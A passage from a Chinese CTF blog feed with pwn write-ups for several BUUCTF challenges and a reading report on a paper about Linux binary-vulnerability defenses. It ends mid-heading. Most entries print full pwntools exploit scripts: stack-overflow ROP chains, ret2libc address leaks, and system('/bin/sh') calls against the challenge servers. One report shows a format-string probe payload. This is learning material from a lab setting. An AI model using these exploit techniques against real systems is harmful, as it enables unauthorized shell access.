punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Correct\n"</span><span class="token punctuation">)</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>main_addr <span class="token operator">=</span> <span class="token number">0x08048825</span>payload2 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xe7</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"write"</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"write"</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>payload3 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xe7</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终在本地打通的结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-6.png"></p><h2 id="2-题目来源—BUUCTF（get-started-3dsctf-2016）"><a href="#2-题目来源—BUUCTF（get-started-3dsctf-2016）" class="headerlink" title="2. 题目来源—BUUCTF（get_started_3dsctf_2016）"></a>2. 题目来源—BUUCTF（get_started_3dsctf_2016）</h2><p>首先对程序进行分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-7.png"></p><p>又是一个32位的程序，我们将其放入ida进行反编译：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-8.png"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-9.png"></p><p>我们很快的可以发现这里存在着gets函数和get_flag子函数，由此我们可以初步的将gets的返回地址指向get_flag函数，要使我们获得flag就必须让a1&#x3D;&#x3D;814536271和a2&#x3D;&#x3D;425138641，所以我们在调用get_flag函数的时候得给携带的参数进行赋值，构建的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># r = process('./get_started')</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28682</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080489a0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0804e6a0</span><span class="token punctuation">)</span> <span class="token operator">+</span>  p32<span class="token punctuation">(</span><span class="token number">0x308cd64f</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x195719d1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终我们获得的结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-10.png"></p><h2 id="3-题目来源—BUUCTF（jarvisoj-level2-x64）"><a href="#3-题目来源—BUUCTF（jarvisoj-level2-x64）" class="headerlink" title="3. 题目来源—BUUCTF（jarvisoj_level2_x64）"></a>3. 题目来源—BUUCTF（jarvisoj_level2_x64）</h2><p>首先对程序进行分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-11.png"></p><p>程序同样没有开启canary保护，但开启了NX保护，但不一样的是这次的程序为64位的，我们将其放入ida中反编译：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-12.png"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-13.png"></p><p>我们可以看到这次的程序比较简单，而且栈溢出非常明显，我们可以在ida中找到binsh字符串的地址：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-14.png"></p><p>对此我们构建的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># r = process('./level2_x64')</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25982</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/hu/桌面/level2_x64'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x00600a90</span>sys_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x004006b3</span>ret_addr <span class="token operator">=</span> <span class="token number">0x004004a1</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在本地打通的结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-15.png"></p><h1 id="知识点回忆与总结："><a href="#知识点回忆与总结：" class="headerlink" title="知识点回忆与总结："></a>知识点回忆与总结：</h1><p>我们在调用函数的时候一定要先注意到程序是32位的还是64位的，不同位数的程序调用到的函数参数是不一样的。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-16.png"></p><p>在对32位程序写exp的时候，主要到各个参数的输入位置：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-17.png"></p><p>在对64位程序写exp的时候，注意到各个参数的输入位置：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/4-18.png"></p><p>ps：上图主要是为了方便理解</p><p>参考网址：</p><p><a href="https://bbs.pediy.com/thread-262357.htm%EF%BC%8C">https://bbs.pediy.com/thread-262357.htm，</a></p><p><a href="https://blog.csdn.net/Gtooler/article/details/120678708">https://blog.csdn.net/Gtooler/article/details/120678708</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ret2libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第七周笔记</title>
      <link href="/uncategorized/%E7%AC%AC%E4%B8%83%E5%91%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/uncategorized/%E7%AC%AC%E4%B8%83%E5%91%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>这周主要是对上周的栈迁移知识点进行了更加深的一次了解，然后接着刷题。。。</p><h1 id="1-jarvisoj-tell-me-something"><a href="#1-jarvisoj-tell-me-something" class="headerlink" title="1. jarvisoj_tell_me_something"></a>1. jarvisoj_tell_me_something</h1><p>首先对程序进行检查：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-1.png"></p><p>为64位程序，然后没有开启canary保护，将其放入ida中进行反编译：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-2.png"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-3.png"></p><p>整个函数的结构比较简单，直接就是简单的栈溢出，构造的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>goodgame_addr<span class="token operator">=</span><span class="token number">0x00400620</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./guestbook'</span><span class="token punctuation">)</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28897</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>goodgame_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打通的结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-4.png"></p><h1 id="2-HarekazeCTF2019-baby-rop2"><a href="#2-HarekazeCTF2019-baby-rop2" class="headerlink" title="2. [HarekazeCTF2019]baby_rop2"></a>2. [HarekazeCTF2019]baby_rop2</h1><p>首先对程序进行检查：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-5.png"></p><p>然后发现其没开canary保护，将其放入ida反编译：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-6.png"></p><p>发现只有一个栈溢出漏洞，程序中没有system函数和&#x2F;bin&#x2F;sh字符串，然后我们考虑用ret2libc方法去做，因为该程序是64位程序，我们需要找到rdi的地址和rsi的地址：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-7.png"><br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-8.png"></p><p>rsi采用第二个，r15在本题中没有用到直接置为0，然后直接套用ret2libc公式去做，构造的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./babyrop2'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span><span class="token comment">#p=process('./babyrop2')</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26417</span><span class="token punctuation">)</span>pop_rdi_adr<span class="token operator">=</span><span class="token number">0x00400733</span>pop_rsi_r15_adr<span class="token operator">=</span><span class="token number">0x00400731</span>format_str<span class="token operator">=</span><span class="token number">0x00400770</span>main_adr<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>printf_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>read_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>payload1<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_adr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>format_str<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15_adr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_adr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>read_adr<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'read_adr:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>read_adr<span class="token punctuation">)</span><span class="token punctuation">)</span>offset<span class="token operator">=</span>read_adr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>sys_adr<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh_adr<span class="token operator">=</span>offset<span class="token operator">+</span><span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload2<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_adr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_adr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_adr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打通的结果如下：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-9.png"></p><p>这flag藏的还挺深的，淦</p><h1 id="3-jarvisoj-level3"><a href="#3-jarvisoj-level3" class="headerlink" title="3. jarvisoj_level3"></a>3. jarvisoj_level3</h1><p>首先对程序进行检查：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-10.png"></p><p>将这个32位程序放入ida反编译：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-11.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-12.png"></p><p>可以看到整个程序比较简单，然后会发现明显的栈溢出，没有system函数和&#x2F;bin&#x2F;sh字符串，所以就是标准的ret2libc的解决方法，比起上一道的64位程序比较简单，然后构造exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context(os='linux',arch='i386',log_level='debug')</span><span class="token comment">#p=remote('node4.buuoj.cn',27589)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span>main_adr<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>write_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>payload1<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_adr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input:\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>write_adr<span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">"write"</span><span class="token punctuation">,</span>write_adr<span class="token punctuation">)</span>offset<span class="token operator">=</span>write_adr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>sys_adr<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh_adr<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>payload2<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_adr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh_adr<span class="token punctuation">)</span><span class="token comment">#p.recvuntil('Input:\n')</span><span class="token comment">#p.recv()</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在本地打通的结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-13.png"></p><p>这里有点疑惑的地方就是我用context(os&#x3D;’linux’,arch&#x3D;’i386’,log_level&#x3D;’debug’)的时候会是下面这种结果：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-14.png"></p><p>No libc satisfies constraints.把我给整不会了，而我用context.log_level&#x3D;’debug’的时候，整个结果就是和打通的结果一样，晕。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-15.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>面向Linux系统下二进制漏洞防御技术的设计与实现</title>
      <link href="/uncategorized/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/"/>
      <url>/uncategorized/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/</url>
      
        <content type="html"><![CDATA[<h2 id="《面向Linux系统的二进制漏洞防御技术的设计与实现》"><a href="#《面向Linux系统的二进制漏洞防御技术的设计与实现》" class="headerlink" title="《面向Linux系统的二进制漏洞防御技术的设计与实现》"></a>《面向Linux系统的二进制漏洞防御技术的设计与实现》</h2><p>​                                                                                                      作者：路来智，胡雪松</p><h2 id="一、阅读总结"><a href="#一、阅读总结" class="headerlink" title="一、阅读总结"></a>一、阅读总结</h2><p>这篇论文向我们介绍了linux环境下程序存在的二进制漏洞，文章整体向我们介绍了二进制漏洞的危害，以及二进制漏洞的演示和防御，阅读完这一篇论文，我理解到了linux下二进制漏洞所存在的条件，即程序中存在危险函数，在编写代码中，函数的调用不安全，容易造成栈溢出、格式化字符串溢出等二进制漏洞，我们避免这种情况只能通过在写代码的过程中，尽量避免使用危险函数。</p><h2 id="二、论文分析"><a href="#二、论文分析" class="headerlink" title="二、论文分析"></a>二、论文分析</h2><p>随着开源软件在世界范围内的影响日益增大，linux操作系统在市场上的份额得到了快速地增长，事实上，我们一般客户机上装载的Windows系统，其图形化界面使得操作更加的简单便捷，linux虽然使用起来也没有Windows方便，但是在服务器的使用上，linux更加安全稳定，Linux采取了许多安全技术措施，包括对读、写控制、带保护的子系统、审计跟踪、核心授权等，这为网络多用户环境中的用户提供了必要的安全保障。</p><p>文章首先向我们介绍了linux下的程序二进制漏洞包括哪些内容，然后介绍了这些漏洞不去处理的话给我们带来的危害，这些漏洞包括：栈溢出、格式化字符串漏洞、伪造io_file、条件竞争、堆利用等等，最常见的漏洞就是栈溢出，就比如说，我们平常使用c、c++去编写代码的时候，有时候函数用的不对就会对内存造成泄露，而黑客就可以利用好这一点去获取你的信息或者控制你的电脑，然后论文接着介绍了ELF动态链接技术和plt hook技术，ELF 是 unix类操作系统的用于可执行文件、目标代码文件、共享链接库文件与核心转储文件的格式。</p><p>当我阅读这篇论文的时候，其实还涉及到了一个知识点，那就是linux的动态链接和静态链接，其实对于这两个概念，我的理解就是，当我想引用一个文章里面的一段文字时，如果我直接将文字赋值到我的文章里面时，那就是静态链接，如果我在我的文章里面附上引用文章的链接让其他人自己去看时，那么这就是动态链接。</p><p>根据我的了解，ELF文件由4部分组成，分别是ELF头（ELF header）、程序头表（Program header table）、节（Section）和节头表（Section header table）。实际上，一个文件中不一定包含全部内容，只有ELF头的位置是固定的，其余各部分的位置、大小等信息由ELF头中的各项值来决定。如下图所示，ELF的概述图：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221208235359065.png" alt="image-20221208235359065"></p><p>hook技术是一种拦截用户函数调用的技术。通过hook技术可以实现统计用户对某些函数的调用次数，对函数注入新的功能的目标。其实和之前提到过栈溢出技术差不多，我们在执行程序时，会进行函数的一个调用，当我们发现程序的plt文件中存在其他函数时，比如说，在CTF的一些pwn的题目中，程序的plt表中存在system(‘&#x2F;bin&#x2F;sh’)这个危险函数时，我们可以通过栈溢出的方式直接控制程序跳转到system的plt地址去执行这个函数，这样的话，我们就获取到了shell权限，提取flag。</p><p>关于上述提到的plt表以及相关的got表的介绍：</p><p>plt和got是动态链接用来重定位的，动态链接的每个函数需要两个东西，一个是用来存放外部函数地址的数据段，另一个是用来获取数据段记录的外部函数地址的代码，对应着两个表，一个用来存放外部函数地址的数据表成为全局偏移量表（GOT），那个存放额外代码的表成为程序链接表（PLT）。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221209004136147.png" alt="image-20221209004136147"></p><p>由上图我们可以看出，可执行文件里面保存的是PLT表的地址，对应PLT地址指向的是GOT的地址，GOT表指向的就是glibc中的地址，继续往下推，我们想要通过PLT表获取函数的地址，首先要保证GOT表已经获取了正确的地址，但是我们如果一开始就对所有函数进行重定位的话，肯定是比较麻烦的，这时候，我通过查资料可知，linux有种叫做延迟绑定的机制，也就是说，只有在动态库函数被调用的时候，才会进行地址解析和重定位的工作。</p><p>接着论文着重向我们介绍了格式化字符串方面的漏洞，以及这漏洞会带来的危害，也就是会造成内存数据的泄露。其实触发这方面的漏洞的函数是有限的，比如说printf还有sprintf，fprintf等c库中print家族的函数，具体的原理也很简单，当printf在输出格式化字符串的时候，会维护一个内部指针，当printf逐步将格式化字符串的字符打印到屏幕，当遇到%的时候，printf会期望它后面跟着一个格式字符串，因此会递增内部字符串以抓取格式控制符的输入值。这就是问题所在，printf无法知道栈上是否放置了正确数量的变量供它操作，如果没有足够的变量可供操作，而指针按正常情况下递增，就会产生越界访问。甚至由于%n的问题，可导致任意地址读写。</p><p>然后论文的作者向我们展示格式化字符串漏洞的一些操作：</p><p>首先是原理介绍</p><p>对于某个存在格式化字符串漏洞的程序，输入以下命令：payload:aaaaaaaa. ％ｐ. ％ｐ. ％ｐ. ％ｐ. ％ｐ. ％ｐ. ％ｐ. ％ｐ. ％ｐ可以看到格式化第１个参数就是printf第６个参数，</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221211173452739.png" alt="image-20221211173452739"></p><p>如图所示，泄露了相邻内存的数据，形成了安全隐患。<br>接着论文向我们介绍了修补这个漏洞的方法：<br>（１）过滤第一个参数中的不可见字符。<br>（２）如果前两个参数相同，使用puts()函数进行替换。<br>hook函数callbefor利用hook技术对printf函数参数进行控制。callbefor函数可以看到， 如果前两个参数相同，那么直接使用puts函数就不会触发格式化字符串漏洞，因为puts函数不会解析格式化字符串。</p><p>接着是系统测试：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221211174527062.png" alt="image-20221211174527062"></p><p>上图是已经被攻击成功的程序，我们可以看到我们已经获取了shell的权限，接着我们就可以获取到我们想要的东西，下面是存在漏洞的函数：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221211174802166.png" alt="image-20221211174802166"></p><p>接着作者对存在该漏洞的函数进行了修改：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221211174822540.png" alt="image-20221211174822540"></p><p>最终的结果是防御成功：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221211174833657.png" alt="image-20221211174833657"></p><h2 id="三、实战演练"><a href="#三、实战演练" class="headerlink" title="三、实战演练"></a>三、实战演练</h2><h3 id="1、题目来源—BUUCTF，第五空间2019决赛pwn5（格式化字符串漏洞）"><a 